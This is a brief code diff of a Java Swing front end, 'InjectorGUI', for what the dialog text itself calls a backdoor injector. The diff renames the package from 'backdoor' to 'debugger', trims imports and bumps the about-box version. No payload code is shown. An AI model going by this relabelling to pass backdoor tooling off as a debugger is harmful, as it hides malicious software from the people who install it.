@@ -1,12 +1,8 @@
-package com.thiccindustries.backdoor;
+package com.thiccindustries.debugger;
 
 import javax.swing.*;
 import javax.swing.filechooser.FileFilter;
-import java.awt.*;
-import java.awt.event.ActionEvent;
-import java.awt.event.ActionListener;
 import java.io.File;
-import java.util.UUID;
 
 public class InjectorGUI{
 
@@ -37,8 +33,8 @@ public class InjectorGUI{
                 JOptionPane.showMessageDialog(
                         null,
                         "Created by: MajesticWaffle @ Thicc Industries,\n" +
-                                "Injector Version: 1.5.1\n" +
-                                "Release Date: September 18 2021\n" +
+                                "Backdoor Version: 1.6\n" +
+                                "Release Date: September 19 2021\n" +
                                 "License: GPL v3.0",
                         "Thicc Industries Injector",
                         JOptionPane.INFORMATION_MESSAGE
